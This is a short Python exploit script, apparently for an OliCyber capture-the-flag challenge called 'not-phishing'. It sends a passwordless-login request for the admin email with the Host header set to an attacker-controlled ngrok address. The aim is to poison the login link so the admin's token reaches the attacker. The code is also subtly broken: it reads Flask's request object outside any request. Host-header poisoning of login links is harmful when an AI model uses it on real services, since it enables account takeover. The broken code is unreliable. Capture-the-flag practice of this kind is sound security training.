#!/usr/bin/env python3
from flask import *
import requests

URL = 'http://not-phishing.challs.olicyber.it:38100'


def exploit():
    r = requests.post(
        URL + '/passwordless_login.php',
        data={'email': 'admin@fakemail.olicyber.it'},
        headers={'Host': request.args['ngrok']}
    )
    print(r.text)
    return 'lol'

exploit()